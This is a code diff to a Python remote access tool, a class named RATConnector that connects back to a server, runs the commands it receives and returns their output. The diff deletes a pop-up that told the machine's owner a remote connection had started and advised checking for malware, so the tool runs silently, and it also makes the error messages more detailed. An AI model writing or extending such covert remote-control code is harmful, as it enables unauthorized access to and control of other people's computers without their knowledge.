@@ -1,13 +1,5 @@
 import socket, subprocess, time, json, os, base64, ctypes, os, sys
 
-ctypes.windll.user32.MessageBoxW(
-    0,
-    "Remote PC connection started, if this wasn't done by you please check your PC for malware",
-    "IMPORTANT MESSAGE",
-    1,
-)
-
-
 class RATConnector:
     def __init__(self, ip, port):
         # Try to connect to the server, if failed wait five seconds and try again.
@@ -92,9 +84,9 @@ class RATConnector:
                     convCommand = self.arrayToString(command)
                     commandResponse = self.runCommand(convCommand).decode()
             # Whole error handling, bad practice but required to keep connection
-            except Exception:
+            except Exception as e:
                 commandResponse = (
-                    "[-] Error running command, check the syntax of the command."
+                    f"[-] Error running command: {e}"
                 )
             self.dataSend(commandResponse)
 
